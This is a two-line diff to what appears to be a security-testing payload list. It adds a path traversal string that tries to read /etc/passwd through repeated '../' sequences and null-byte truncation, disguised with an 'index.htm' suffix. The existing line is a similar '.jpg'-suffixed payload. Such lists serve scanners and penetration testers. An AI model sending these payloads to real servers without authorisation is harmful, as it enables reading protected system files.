@@ -1,1 +1,2 @@
 /js/../../../../../../../../etc/passwd%00.jpg
+/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
